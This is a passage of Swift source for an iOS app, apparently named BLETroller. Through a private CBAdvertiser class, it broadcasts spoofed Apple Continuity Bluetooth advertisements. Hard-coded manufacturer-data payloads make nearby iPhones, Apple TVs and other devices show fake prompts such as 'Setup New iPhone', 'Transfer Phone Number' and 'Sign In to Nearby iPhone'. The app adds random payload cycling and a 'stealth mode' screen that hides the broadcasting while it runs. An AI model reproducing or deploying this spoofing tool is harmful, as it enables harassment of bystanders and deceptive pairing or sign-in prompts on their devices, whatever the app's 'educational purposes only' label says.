        guard let overlay = stealthOverlayView else { return }
        overlay.layer.removeAllAnimations()
        overlay.isHidden = false
        overlay.alpha = 1.0

        let width = view.bounds.width
        let height = view.bounds.height

        if lastStealthSwipeDirection == .left {
            overlay.frame = CGRect(x: width, y: 0, width: width, height: height)
        } else {
            overlay.frame = CGRect(x: -width, y: 0, width: width, height: height)
        }

        UIView.animate(withDuration: 0.45, delay: 0, usingSpringWithDamping: 0.85, initialSpringVelocity: 0.5, options: .curveEaseInOut) {
            overlay.frame = CGRect(x: 0, y: 0, width: width, height: height)
        } completion: { _ in
            UIImpactFeedbackGenerator(style: .heavy).impactOccurred()
            if shouldBroadcast, !self.isBroadcasting {
                self.startBroadcasting()
            }
        }
    }

    @objc private func exitStealthMode() {
        if !isStealthModeEnabled { return }
        UIImpactFeedbackGenerator(style: .medium).impactOccurred()

        guard let overlay = stealthOverlayView else { return }
        let width = view.bounds.width
        let height = view.bounds.height

        let targetX = lastStealthSwipeDirection == .left ? width : -width

        UIView.animate(withDuration: 0.4, delay: 0, usingSpringWithDamping: 0.85, initialSpringVelocity: 0.5, options: .curveEaseInOut) {
            overlay.frame = CGRect(x: targetX, y: 0, width: width, height: height)
        } completion: { _ in
            overlay.isHidden = true
            self.isStealthModeEnabled = false
            self.setNeedsStatusBarAppearanceUpdate()
            self.setNeedsUpdateOfHomeIndicatorAutoHidden()
            self.setNeedsUpdateOfScreenEdgesDeferringSystemGestures()
        }
    }

    @objc private func handleSecretReset(_ gesture: UILongPressGestureRecognizer) {
        if gesture.state == .began {
            UIImpactFeedbackGenerator(style: .heavy).impactOccurred()
            UserDefaults.standard.removeObject(forKey: hasSeenStealthModeAlertDefaultsKey)
            UserDefaults.standard.synchronize()
            logToConsole("Resetting the stealth warning… closing the app.", category: 3)
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.75) {
                exit(0)
            }
        }
    }

    private func setupPrivacyCoverIfNeeded() {
        if privacyCoverView != nil { return }

        let cover = UIView(frame: view.bounds)
        cover.backgroundColor = .systemBackground
        cover.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        cover.isHidden = true
        cover.alpha = 0.0
        cover.isUserInteractionEnabled = false

        let symbolName = "antenna.radiowaves.left.and.right"
        let symCfg = UIImage.SymbolConfiguration(pointSize: 96, weight: .bold)
        let symbolImage = UIImage(systemName: symbolName, withConfiguration: symCfg)

        let iconView = UIImageView(image: symbolImage)
        iconView.tintColor = view.tintColor
        iconView.contentMode = .scaleAspectFit
        iconView.translatesAutoresizingMaskIntoConstraints = false
        cover.addSubview(iconView)

        let titleLabel = UILabel()
        let bundleName = (Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String)
            ?? (Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String)
        titleLabel.text = (bundleName?.isEmpty == false) ? bundleName : "BLETroller"
        titleLabel.font = UIFont.systemFont(ofSize: 42, weight: .black)
        titleLabel.textColor = .label
        titleLabel.translatesAutoresizingMaskIntoConstraints = false
        cover.addSubview(titleLabel)

        let disclaimerLabel = UILabel()
        disclaimerLabel.text = "For educational purposes only!"
        disclaimerLabel.font = UIFont.systemFont(ofSize: 12, weight: .semibold)
        disclaimerLabel.textColor = .secondaryLabel
        disclaimerLabel.numberOfLines = 0
        disclaimerLabel.textAlignment = .center
        disclaimerLabel.translatesAutoresizingMaskIntoConstraints = false
        cover.addSubview(disclaimerLabel)

        NSLayoutConstraint.activate([
            iconView.centerXAnchor.constraint(equalTo: cover.centerXAnchor),
            iconView.centerYAnchor.constraint(equalTo: cover.centerYAnchor, constant: -30),
            iconView.widthAnchor.constraint(equalToConstant: 100),
            iconView.heightAnchor.constraint(equalToConstant: 100),
            titleLabel.topAnchor.constraint(equalTo: iconView.bottomAnchor, constant: 15),
            titleLabel.centerXAnchor.constraint(equalTo: cover.centerXAnchor),
            disclaimerLabel.leadingAnchor.constraint(equalTo: cover.leadingAnchor, constant: 24),
            disclaimerLabel.trailingAnchor.constraint(equalTo: cover.trailingAnchor, constant: -24),
            disclaimerLabel.bottomAnchor.constraint(equalTo: cover.safeAreaLayoutGuide.bottomAnchor, constant: -14),
        ])

        view.addSubview(cover)
        view.bringSubviewToFront(cover)
        privacyCoverView = cover
    }

    @objc private func handleAppWillResignActive() {
        guard let privacyCoverView else { return }
        view.bringSubviewToFront(privacyCoverView)
        privacyCoverView.isHidden = false
        privacyCoverView.alpha = 1.0
    }

    @objc private func handleAppDidBecomeActive() {
        guard let privacyCoverView, !privacyCoverView.isHidden else { return }
        UIView.animate(withDuration: 0.2, delay: 0, options: .curveEaseInOut) {
            privacyCoverView.alpha = 0.0
        } completion: { _ in
            privacyCoverView.isHidden = true
        }
    }

    private func scrollConsoleToBottom(animated: Bool) {
        guard consoleTextView.text.count > 0 else { return }
        consoleTextView.layoutIfNeeded()
        let minY = -consoleTextView.contentInset.top
        let maxY = consoleTextView.contentSize.height - consoleTextView.bounds.size.height + consoleTextView.contentInset.bottom
        let y = max(minY, maxY)
        consoleTextView.setContentOffset(CGPoint(x: 0, y: y), animated: animated)
    }

    private func requestAutoScroll() {
        guard shouldAutoScrollLog else { return }
        guard !pendingAutoScroll else { return }
        pendingAutoScroll = true
        DispatchQueue.main.async {
            self.pendingAutoScroll = false
            if self.consoleTextView.isDragging || self.consoleTextView.isDecelerating { return }
            self.scrollConsoleToBottom(animated: true)
        }
    }

    private func logToConsole(_ message: String?, category: Int = 0) {
        DispatchQueue.main.async {
            let df = DateFormatter()
            df.dateFormat = "HH:mm:ss"
            let timeStr = df.string(from: Date())
            let displayMsg = (message ?? "").trimmingCharacters(in: .whitespacesAndNewlines)
            guard !displayMsg.isEmpty else { return }

            let textColor: UIColor
            switch category {
            case 1: textColor = .systemGreen
            case 2: textColor = .systemRed
            case 3: textColor = .systemOrange
            case 4: textColor = .systemBlue
            default: textColor = .secondaryLabel
            }

            let fmt = "[\(timeStr)] \(displayMsg)\n"
            let font = UIFontMetrics.default.scaledFont(for: UIFont(name: "CourierNewPS-BoldMT", size: 13) ?? UIFont.monospacedSystemFont(ofSize: 13, weight: .bold))
            let attrStr = NSAttributedString(string: fmt, attributes: [
                .foregroundColor: textColor,
                .font: font,
            ])

            let cur = NSMutableAttributedString(attributedString: self.consoleTextView.attributedText ?? NSAttributedString())
            cur.append(attrStr)
            self.consoleTextView.attributedText = cur
            self.consoleTextView.layoutIfNeeded()
            self.requestAutoScroll()
        }
    }

    private func broadcastingSubtitle() -> String {
        "Broadcasting as \(UIDevice.current.name)"
    }

    private func computeBroadcastDisabledReason() -> String? {
        if NSClassFromString("CBAdvertiser") == nil {
            return "Broadcasting unavailable. Install via TrollStore."
        }
        if let prov = Bundle.main.path(forResource: "embedded", ofType: "mobileprovision"), !prov.isEmpty {
            return "Install via TrollStore to enable broadcasting."
        }
        return nil
    }

    private func refreshBroadcastEligibilityUI() {
        if broadcastDisabledReason == nil {
            broadcastDisabledReason = computeBroadcastDisabledReason()
        }

        guard var cfg = toggleButton.configuration else { return }

        if let reason = broadcastDisabledReason, !reason.isEmpty {
            cfg.title = "Requires TrollStore"
            cfg.subtitle = reason
            cfg.attributedSubtitle = nil
            cfg.titlePadding = 4
            cfg.baseBackgroundColor = .systemGray
            toggleButton.configuration = cfg
            toggleButton.layer.shadowOpacity = 0.0
            setStatus("Install Required")
            logToConsole(reason, category: 2)
            return
        }

        toggleButton.configuration = cfg
        toggleButton.layer.shadowOpacity = 0.3
        toggleButton.layer.shadowColor = (isBroadcasting ? UIColor.systemRed : view.tintColor).cgColor

        if isBroadcasting {
            animateToggleButton(toTitle: "Stop Broadcasting", subtitle: broadcastingSubtitle(), color: .systemRed)
        } else {
            animateToggleButton(toTitle: "Start Broadcasting", subtitle: broadcastingSubtitle(), color: view.tintColor)
        }
    }

    private func animateToggleButton(toTitle title: String, subtitle: String?, color: UIColor) {
        toggleButtonAnimationToken += 1
        let token = toggleButtonAnimationToken

        toggleButton.layer.removeAllAnimations()
        toggleButton.transform = .identity

        guard var config = toggleButton.configuration else { return }
        config.title = title
        config.titleAlignment = .center

        if let subtitle {
            config.titlePadding = 4
            config.subtitle = subtitle
            config.attributedSubtitle = nil
            config.subtitleTextAttributesTransformer = UIConfigurationTextAttributesTransformer { incoming in
                var out = incoming
                out.font = UIFontMetrics.default.scaledFont(for: UIFont.systemFont(ofSize: 14, weight: .medium))
                out.foregroundColor = UIColor.white.withAlphaComponent(0.8)
                return out
            }
        } else {
            config.subtitle = nil
            config.attributedSubtitle = nil
            config.subtitleTextAttributesTransformer = nil
        }

        config.baseBackgroundColor = color

        UIView.animate(withDuration: 0.12, delay: 0, options: [.curveEaseOut, .allowUserInteraction]) {
            self.toggleButton.transform = CGAffineTransform(scaleX: 0.95, y: 0.95)
        } completion: { _ in
            guard token == self.toggleButtonAnimationToken else { return }
            self.toggleButton.configuration = config
            UIView.animate(withDuration: 0.4, delay: 0, usingSpringWithDamping: 0.6, initialSpringVelocity: 0.8, options: [.allowUserInteraction]) {
                self.toggleButton.transform = .identity
            }
        }
    }

    private func startRadarAnimation() {
        radarPulseView.isHidden = false
        radarPulseView.transform = CGAffineTransform(scaleX: 0.1, y: 0.1)
        radarPulseView.alpha = 1.0
        UIView.animate(withDuration: 1.5, delay: 0, options: [.curveEaseOut, .repeat]) {
            self.radarPulseView.transform = CGAffineTransform(scaleX: 3.0, y: 3.0)
            self.radarPulseView.alpha = 0.0
        }
    }

    private func stopRadarAnimation() {
        radarPulseView.layer.removeAllAnimations()
        radarPulseView.isHidden = true
    }

    private func setScannerPillCollapsed(_ collapsed: Bool, animated: Bool) {
        if isScannerPillCollapsed == collapsed { return }
        isScannerPillCollapsed = collapsed

        let leadingInset: CGFloat = collapsed ? 10.0 : 14.0
        let trailingInset: CGFloat = collapsed ? -10.0 : -14.0
        radarPillStackLeadingConstraint?.constant = leadingInset
        radarPillStackTrailingConstraint?.constant = trailingInset

        let changes = {
            self.radarStatusLabel.isHidden = collapsed
            self.view.layoutIfNeeded()
        }

        if !animated {
            changes()
            return
        }

        UIView.animate(withDuration: 0.34, delay: 0, usingSpringWithDamping: 0.86, initialSpringVelocity: 0.35, options: .allowUserInteraction) {
            changes()
        }
    }

    private func revealScannerPill(forDuration duration: TimeInterval) {
        scannerPillCollapseTimer?.invalidate()
        scannerPillCollapseTimer = nil
        setScannerPillCollapsed(false, animated: true)

        scannerPillCollapseTimer = Timer.scheduledTimer(withTimeInterval: duration, repeats: false) { [weak self] _ in
            self?.setScannerPillCollapsed(true, animated: true)
        }
    }

    private func setupAnimatedSplashScreen() {
        let splash = UIView(frame: view.bounds)
        splash.backgroundColor = .systemBackground
        splash.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        view.addSubview(splash)

        let symbolName = "antenna.radiowaves.left.and.right"
        let symCfg = UIImage.SymbolConfiguration(pointSize: 96, weight: .bold)
        let symbolImage = UIImage(systemName: symbolName, withConfiguration: symCfg)

        let iconView = UIImageView(image: symbolImage)
        iconView.tintColor = view.tintColor
        iconView.contentMode = .scaleAspectFit
        iconView.translatesAutoresizingMaskIntoConstraints = false
        splash.addSubview(iconView)

        let titleLabel = UILabel()
        let bundleName = (Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String)
            ?? (Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String)
        titleLabel.text = (bundleName?.isEmpty == false) ? bundleName : "BLETroller"
        titleLabel.font = UIFont.systemFont(ofSize: 42, weight: .black)
        titleLabel.textColor = .label
        titleLabel.translatesAutoresizingMaskIntoConstraints = false
        splash.addSubview(titleLabel)

        let disclaimerLabel = UILabel()
        disclaimerLabel.text = "For educational purposes only!"
        disclaimerLabel.font = UIFont.systemFont(ofSize: 12, weight: .semibold)
        disclaimerLabel.textColor = .secondaryLabel
        disclaimerLabel.numberOfLines = 0
        disclaimerLabel.textAlignment = .center
        disclaimerLabel.translatesAutoresizingMaskIntoConstraints = false
        splash.addSubview(disclaimerLabel)

        NSLayoutConstraint.activate([
            iconView.centerXAnchor.constraint(equalTo: splash.centerXAnchor),
            iconView.centerYAnchor.constraint(equalTo: splash.centerYAnchor, constant: -30),
            iconView.widthAnchor.constraint(equalToConstant: 100),
            iconView.heightAnchor.constraint(equalToConstant: 100),
            titleLabel.topAnchor.constraint(equalTo: iconView.bottomAnchor, constant: 15),
            titleLabel.centerXAnchor.constraint(equalTo: splash.centerXAnchor),
            disclaimerLabel.leadingAnchor.constraint(equalTo: splash.leadingAnchor, constant: 24),
            disclaimerLabel.trailingAnchor.constraint(equalTo: splash.trailingAnchor, constant: -24),
            disclaimerLabel.bottomAnchor.constraint(equalTo: splash.safeAreaLayoutGuide.bottomAnchor, constant: -14),
        ])

        iconView.transform = CGAffineTransform(scaleX: 0.3, y: 0.3)
        iconView.alpha = 0.0
        titleLabel.alpha = 0.0
        titleLabel.transform = CGAffineTransform(translationX: 0, y: 16)
        disclaimerLabel.alpha = 0.0
        disclaimerLabel.transform = CGAffineTransform(translationX: 0, y: 10)

        UIView.animate(withDuration: 0.42, delay: 0, usingSpringWithDamping: 0.72, initialSpringVelocity: 0.9, options: .curveEaseOut) {
            iconView.transform = .identity
            iconView.alpha = 1.0
            titleLabel.alpha = 1.0
            titleLabel.transform = .identity
        }

        UIView.animate(withDuration: 0.40, delay: 0.18, usingSpringWithDamping: 0.9, initialSpringVelocity: 0.6, options: .curveEaseOut) {
            disclaimerLabel.alpha = 1.0
            disclaimerLabel.transform = .identity
        }

        DispatchQueue.main.asyncAfter(deadline: .now() + 0.8) {
            UIView.animate(withDuration: 0.25, delay: 0, options: .curveEaseInOut) {
                splash.alpha = 0.0
                splash.transform = CGAffineTransform(scaleX: 1.15, y: 1.15)
            } completion: { _ in
                splash.removeFromSuperview()
            }
        }
    }

    @objc private func toggleBroadcasting() {
        if let reason = broadcastDisabledReason, !reason.isEmpty {
            refreshBroadcastEligibilityUI()
            return
        }

        if isBroadcasting {
            stopBroadcasting()
            return
        }

        if isAppleTVConnectingTarget(selectedDevice) {
            let wVC = AppleTVWarningViewController()
            wVC.onDismiss = { [weak self] in
                self?.startBroadcasting()
            }
            wVC.onCancel = { [weak self] in
                self?.stopBroadcasting()
            }
            wVC.modalPresentationStyle = .pageSheet
            if #available(iOS 15.0, *) {
                if let sheet = wVC.sheetPresentationController {
                    sheet.detents = [.large()]
                    sheet.prefersGrabberVisible = true
                    sheet.preferredCornerRadius = 24.0
                }
            }
            present(wVC, animated: true)
            return
        }

        startBroadcasting()
    }

    @objc private func toggleDiscoveryLogging() {
        isDiscoveryLoggingEnabled = !isDiscoveryLoggingEnabled
        UIImpactFeedbackGenerator(style: .light).impactOccurred()
        
        revealScannerPill(forDuration: 1.6)
        
        UIView.animate(withDuration: 0.25, delay: 0, options: .curveEaseInOut) {
            if self.isDiscoveryLoggingEnabled {
                self.radarIndicatorDot.backgroundColor = self.view.tintColor
                self.radarIndicatorDot.layer.shadowColor = self.view.tintColor.cgColor
                self.radarIndicatorDot.layer.shadowRadius = 4
                self.radarIndicatorDot.layer.shadowOpacity = 1.0
                self.radarIndicatorDot.layer.shadowOffset = .zero
                self.radarStatusLabel.text = "Radar: On"
                self.radarStatusLabel.textColor = self.view.tintColor
                self.logTogglePill.contentView.backgroundColor = self.view.tintColor.withAlphaComponent(0.12)
            } else {
                self.radarIndicatorDot.backgroundColor = .secondaryLabel.withAlphaComponent(0.6)
                self.radarIndicatorDot.layer.shadowOpacity = 0
                self.radarStatusLabel.text = "Radar: Off"
                self.radarStatusLabel.textColor = .secondaryLabel
                self.logTogglePill.contentView.backgroundColor = UIColor.tertiarySystemFill.withAlphaComponent(0.15)
            }
        }
        
        if isDiscoveryLoggingEnabled {
            logToConsole("Nearby Bluetooth devices will appear in the log.", category: 4)
            guard let centralManager else { return }
            if centralManager.state == .poweredOn {
                centralManager.scanForPeripherals(withServices: nil, options: [CBCentralManagerScanOptionAllowDuplicatesKey: NSNumber(value: false)])
            } else {
                logToConsole("Bluetooth is unavailable right now, so radar is paused.", category: 3)
            }
        } else {
            centralManager?.stopScan()
        }
    }

    private func exactManufacturerTarget(name: String, type: UInt8, flags: UInt8, bytes: [UInt8]) -> [String: Any] {
        [
            "name": name,
            "type": NSNumber(value: type),
            "flags": NSNumber(value: flags),
            "model": NSNumber(value: UInt16(0x0000)),
            "payloadKind": "manufacturerData",
            "manufacturerData": Data(bytes),
        ]
    }

    private func legacyActionTarget(name: String, type: UInt8, flags: UInt8) -> [String: Any] {
        [
            "name": name,
            "type": NSNumber(value: type),
            "flags": NSNumber(value: flags),
            "model": NSNumber(value: UInt16(0x0000)),
        ]
    }

    private func manufacturerDataForSelectedDevice() -> Data? {
        if (selectedDevice["payloadKind"] as? String) == "manufacturerData" {
            return selectedDevice["manufacturerData"] as? Data
        }
        return nil
    }

    private func applySelectedTarget(_ dict: [String: Any], randomlySelected: Bool) {
        let wasBroadcasting = isBroadcasting
        let duration = currentBroadcastDuration
        if wasBroadcasting { stopBroadcasting() }

        selectedDevice = dict
        UserDefaults.standard.set(dict, forKey: BLETrollerLastSelectedTargetDefaultsKey)
        UserDefaults.standard.synchronize()

        if var config = deviceSelectButton.configuration {
            config.title = dict["name"] as? String
            deviceSelectButton.configuration = config
        }

        logToConsole("Selected payload: \(dict["name"] as? String ?? "")", category: 4)

        if wasBroadcasting {
            if isAppleTVConnectingTarget(dict) {
                let wVC = AppleTVWarningViewController()
                wVC.onDismiss = { [weak self] in
                    self?.startBroadcasting(withDuration: duration)
                }
                wVC.onCancel = { [weak self] in
                    self?.stopBroadcasting()
                }
                wVC.modalPresentationStyle = .pageSheet
                if #available(iOS 15.0, *) {
                    if let sheet = wVC.sheetPresentationController {
                        sheet.detents = [.large()]
                        sheet.prefersGrabberVisible = true
                        sheet.preferredCornerRadius = 24.0
                    }
                }
                present(wVC, animated: true)
            } else {
                startBroadcasting(withDuration: duration)
            }
        }
    }

    private func createActions(for items: [[String: Any]]) -> [UIAction] {
        items.map { dict in
            let title = dict["name"] as? String ?? ""
            let action = UIAction(title: title) { [weak self] _ in
                self?.applySelectedTarget(dict, randomlySelected: false)
            }
            if (dict["disabled"] as? NSNumber)?.boolValue == true {
                action.attributes = .disabled
            }
            return action
        }
    }

    private func setupNestedDropdownMenu() {
        let tvAutoFill: [UInt8] = [0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC1, 0x13, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]
        let tvConnecting: [UInt8] = [0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC0, 0x27, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]
        let tvNewUser: [UInt8] = [0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC1, 0x20, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]
        let tvAudioSync: [UInt8] = [0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC0, 0x19, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]
        let tvColorBal: [UInt8] = [0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC0, 0x1E, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]
        let tvHomeKit: [UInt8] = [0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC0, 0x0D, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
        let tvAppleID: [UInt8] = [0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC1, 0x2B, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]
        let setupNewPh: [UInt8] = [0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC0, 0x09, 0x60, 0x4C, 0x95, 0x01, 0x00, 0x10, 0x00, 0x00, 0x00]
        let transNum: [UInt8] = [0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC0, 0x02, 0x60, 0x4C, 0x95, 0x01, 0x00, 0x10, 0x00, 0x00, 0x00]
        let homePodSetup: [UInt8] = [0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC0, 0x0B, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]

        var appletv: [[String: Any]] = [
            exactManufacturerTarget(name: "Apple TV AutoFill", type: 0x13, flags: 0xC1, bytes: tvAutoFill),
            exactManufacturerTarget(name: "Apple TV Connecting...", type: 0x27, flags: 0xC0, bytes: tvConnecting),
            exactManufacturerTarget(name: "Join This Apple TV?", type: 0x20, flags: 0xC1, bytes: tvNewUser),
            exactManufacturerTarget(name: "Apple TV Audio Sync", type: 0x19, flags: 0xC0, bytes: tvAudioSync),
            exactManufacturerTarget(name: "Apple TV Color Balance", type: 0x1E, flags: 0xC0, bytes: tvColorBal),
            legacyActionTarget(name: "Setup New Apple TV", type: 0x01, flags: 0xC0),
            legacyActionTarget(name: "Pair Apple TV", type: 0x06, flags: 0xC0),
            exactManufacturerTarget(name: "HomeKit Apple TV Setup", type: 0x0D, flags: 0xC0, bytes: tvHomeKit),
            exactManufacturerTarget(name: "Use Apple ID on Apple TV", type: 0x2B, flags: 0xC1, bytes: tvAppleID),
        ]
        appletv.sort { ($0["name"] as? String ?? "") > ($1["name"] as? String ?? "") }

        var others: [[String: Any]] = [
            exactManufacturerTarget(name: "Setup New iPhone", type: 0x09, flags: 0xC0, bytes: setupNewPh),
            exactManufacturerTarget(name: "Transfer Phone Number", type: 0x02, flags: 0xC0, bytes: transNum),
            exactManufacturerTarget(name: "HomePod Setup", type: 0x0B, flags: 0xC0, bytes: homePodSetup),
            legacyActionTarget(name: "Apple Watch", type: 0x05, flags: 0xC0),
            legacyActionTarget(name: "Apple Vision Pro", type: 0x24, flags: 0xC0),
            legacyActionTarget(name: "Sign In to Nearby iPhone", type: 0x2F, flags: 0xC0),
        ]
        others.sort { ($0["name"] as? String ?? "") > ($1["name"] as? String ?? "") }

        let combined = appletv + others
        allTargets = combined

        let randomAction = UIAction(title: "Random", image: UIImage(systemName: "shuffle")) { [weak self] _ in
            guard let self else { return }
            let valid = combined.filter { ($0["disabled"] as? NSNumber)?.boolValue != true }
            if valid.isEmpty { return }
            self.applySelectedTarget(valid[Int.random(in: 0..<valid.count)], randomlySelected: true)
        }

        let tvMenu = UIMenu(title: "Apple TV", image: UIImage(systemName: "appletv"), identifier: nil, options: [], children: createActions(for: appletv))
        let othersMenu = UIMenu(title: "Other Devices", image: UIImage(systemName: "applewatch"), identifier: nil, options: [], children: createActions(for: others))

        deviceSelectButton.menu = UIMenu(title: "Select Payload", children: [randomAction, tvMenu, othersMenu])
        deviceSelectButton.showsMenuAsPrimaryAction = true
    }

    private func randomValidTarget() -> [String: Any]? {
        let valid = allTargets.filter { ($0["disabled"] as? NSNumber)?.boolValue != true }
        if valid.isEmpty { return nil }
        return valid[Int.random(in: 0..<valid.count)]
    }

    private func isAppleTVConnectingTarget(_ target: [String: Any]) -> Bool {
        (target["name"] as? String) == "Apple TV Connecting..."
    }

    private func startBroadcasting() { startBroadcasting(withDuration: 0) }

    private func startBroadcasting(withDuration duration: TimeInterval) {
        if let reason = broadcastDisabledReason, !reason.isEmpty {
            refreshBroadcastEligibilityUI()
            return
        }
        if isBroadcasting { stopRadioOnly() }
        isBroadcasting = true
        currentBroadcastDuration = duration
        shouldAutoScrollLog = true
        consoleTextView.isUserInteractionEnabled = false
        scrollConsoleToBottom(animated: false)

        UIImpactFeedbackGenerator(style: .rigid).impactOccurred()
        animateToggleButton(toTitle: "Stop Broadcasting", subtitle: broadcastingSubtitle(), color: .systemRed)

        if duration > 0 {
            broadcastDurationTimer?.invalidate()
            broadcastDurationTimer = Timer.scheduledTimer(withTimeInterval: duration, repeats: false) { [weak self] _ in
                guard let self else { return }
                if self.isBroadcasting {
                    self.logToConsole("Timed broadcast finished.", category: 0)
                    self.stopBroadcasting()
                }
            }
            logToConsole(String(format: "Timed broadcast: will stop in %.0fs.", duration), category: 0)
        }

        let type = (selectedDevice["type"] as? NSNumber)?.uint8Value ?? 0
        let flags = (selectedDevice["flags"] as? NSNumber)?.uint8Value ?? 0
        let modelID = (selectedDevice["model"] as? NSNumber)?.uint16Value ?? 0
        let name = (selectedDevice["name"] as? String) ?? "Unknown"
        let mfgData = manufacturerDataForSelectedDevice()

        guard let cls = NSClassFromString("CBAdvertiser") as? NSObject.Type else {
            broadcastDisabledReason = "Broadcasting unavailable. Install via TrollStore."
            stopBroadcasting()
            refreshBroadcastEligibilityUI()
            return
        }

        let adv = cls.init()
        activeAdvertiser = adv

        ObjCBridge.send(adv, NSSelectorFromString("setLabel:"), object: "TrollStoreSpoofer" as NSString)

        if let mfgData, !mfgData.isEmpty, adv.responds(to: NSSelectorFromString("setManufacturerData:")) {
            ObjCBridge.send(adv, NSSelectorFromString("setManufacturerData:"), object: mfgData as NSData)
        } else if modelID == 0x0000 {
            if type == 0x10 {
                ObjCBridge.send(adv, NSSelectorFromString("setNearbyInfoFlags:"), uint8: flags)
            } else {
                ObjCBridge.send(adv, NSSelectorFromString("setNearbyActionType:"), uint8: type)
                ObjCBridge.send(adv, NSSelectorFromString("setNearbyActionFlags:"), uint8: flags)
            }
        }

        ObjCBridge.activate(adv) { [weak self] errorObj in
            DispatchQueue.main.async {
                guard let self else { return }
                if let errorObj {
                    let desc = String(describing: errorObj).lowercased()
                    if self.broadcastDisabledReason == nil,
                       desc.contains("entitlement") || desc.contains("not permitted") || desc.contains("not allowed") {
                        self.broadcastDisabledReason = "Missing required entitlements. Install via TrollStore."
                    }
                    self.stopBroadcasting()
                    if let reason = self.broadcastDisabledReason, !reason.isEmpty {
                        self.refreshBroadcastEligibilityUI()
                    }
                    self.setStatus("Error")
                    self.logToConsole("Broadcast failed.", category: 2)
                } else {
                    self.setStatus("Broadcasting")
                    self.startRadarAnimation()
                    self.logToConsole("Broadcasting: \(name)", category: 1)

                    self.dotCount = 0
                    self.dotTimer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { [weak self] _ in
                        guard let self else { return }
                        self.dotCount = (self.dotCount + 1) % 4
                        let dots = String(repeating: ".", count: self.dotCount)
                        self.mainTitleLabel.text = "Broadcasting\(dots)"
                    }
                }
            }
        }
    }

    private func stopRadioOnly() {
        dotTimer?.invalidate()
        dotTimer = nil
        broadcastDurationTimer?.invalidate()
        broadcastDurationTimer = nil
        if let adv = activeAdvertiser {
            ObjCBridge.sendVoid(adv, NSSelectorFromString("invalidate"))
            activeAdvertiser = nil
        }
    }

    private func stopBroadcasting() {
        isBroadcasting = false
        currentBroadcastDuration = 0
        stopRadioOnly()
        UIImpactFeedbackGenerator(style: .medium).impactOccurred()
        animateToggleButton(toTitle: "Start Broadcasting", subtitle: broadcastingSubtitle(), color: view.tintColor)
        stopRadarAnimation()
        setStatus("Ready!")
        consoleTextView.isUserInteractionEnabled = true
    }

    @objc private func handleQuickActionNotification(_ note: Notification) {
        let type = (note.userInfo?["type"] as? String) ?? ""
        guard !type.isEmpty else { return }
        UserDefaults.standard.removeObject(forKey: BLETrollerPendingQuickActionDefaultsKey)
        UserDefaults.standard.synchronize()
        DispatchQueue.main.async { [weak self] in
            self?.performQuickActionType(type)
        }
    }

    private func consumePendingQuickActionIfNeeded() {
        let type = UserDefaults.standard.string(forKey: BLETrollerPendingQuickActionDefaultsKey) ?? ""
        guard !type.isEmpty else { return }
        UserDefaults.standard.removeObject(forKey: BLETrollerPendingQuickActionDefaultsKey)
        UserDefaults.standard.synchronize()
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.95) { [weak self] in
            self?.performQuickActionType(type)
        }
    }

    private func performQuickActionType(_ type: String) {
        if let reason = broadcastDisabledReason, !reason.isEmpty {
            toggleBroadcasting()
            return
        }

        guard let target = randomValidTarget() else { return }
        if isBroadcasting { stopBroadcasting() }
        applySelectedTarget(target, randomlySelected: true)
        UIImpactFeedbackGenerator(style: .light).impactOccurred()

        if type == "com.bletroller.broadcastRandom" {
            toggleBroadcasting()
        }
    }

    func contextMenuInteraction(_ interaction: UIContextMenuInteraction, configurationForMenuAtLocation location: CGPoint) -> UIContextMenuConfiguration? {
        if interaction.view !== toggleButton { return nil }
        return UIContextMenuConfiguration(identifier: nil, previewProvider: nil) { [weak self] _ in
            guard let self else { return nil }
            let title = self.isStealthModeEnabled ? "Exit Stealth Mode" : (self.isBroadcasting ? "Enter Stealth Mode" : "Broadcast and Enter Stealth Mode")
            let icon = self.isStealthModeEnabled ? "eye" : "eye.slash.fill"
            let stealthAction = UIAction(title: title, image: UIImage(systemName: icon)) { _ in
                if self.isStealthModeEnabled { self.exitStealthMode() }
                else { self.enterStealthMode(withBroadcast: !self.isBroadcasting) }
            }
            return UIMenu(title: "", children: [stealthAction])
        }
    }

    func centralManagerDidUpdateState(_ central: CBCentralManager) {
        let changed = (central.state != lastCentralState)
        lastCentralState = central.state

        if central.state == .poweredOn {
            if changed { logToConsole("Bluetooth radar available.", category: 4) }
            if isDiscoveryLoggingEnabled {
                central.scanForPeripherals(withServices: nil, options: [CBCentralManagerScanOptionAllowDuplicatesKey: NSNumber(value: false)])
            }
            return
        }

        central.stopScan()
        if !changed { return }

        switch central.state {
